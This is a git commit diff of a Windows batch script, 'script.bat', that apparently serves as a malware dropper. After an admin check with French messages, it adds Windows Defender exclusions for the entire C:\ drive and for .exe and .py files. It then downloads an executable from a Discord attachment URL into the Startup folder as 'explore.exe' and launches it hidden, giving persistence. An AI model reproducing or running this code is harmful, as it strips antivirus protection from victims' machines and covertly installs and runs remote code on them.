5fd01da133f70c713d1d20b31d30b1d2550c6fc5
M4lware <128651023+M4lware-01@users.noreply.github.com>
2023-08-07 19:40:31 +0600

    Update script.bat

--- script.bat
+++ script.bat
@@ -1,15 +1,15 @@
 @echo off
-set ^"|find "::">nul 2>&1 && goto :no || goto :yes
 
-:no
+>nul 2>&1 net session || (
+    echo Pour pouvoir utiliser l'utilitaire, vous devez être un administrateur
+    echo exécutant une session de console.
+    pause
+    exit
+)
+
 chcp 65001 > nul
-echo Pour pouvoir utiliser l'utilitaire, vous devez être un administrateur
-echo exécutant une session de console.
-pause
-chcp 850 > nul
-goto :EOF
 
-:yes
+:: Le reste du script à exécuter avec des privilèges d'administrateur
 set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
 powershell -Command "Add-MpPreference -ExclusionExtension '.exe'"
@@ -19,4 +19,4 @@ powershell -Command "Add-MpPreference -ExclusionExtension '.py'"
 set "DownloadURL=https://cdn.discordapp.com/attachments/1130988233761771581/1137590314295636058/x.exe"
 set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\explore.exe"
 powershell -Command "Invoke-WebRequest -useb '%DownloadURL%' -o '%DestinationPath%'"
-powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden" 2>nul
+powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden"
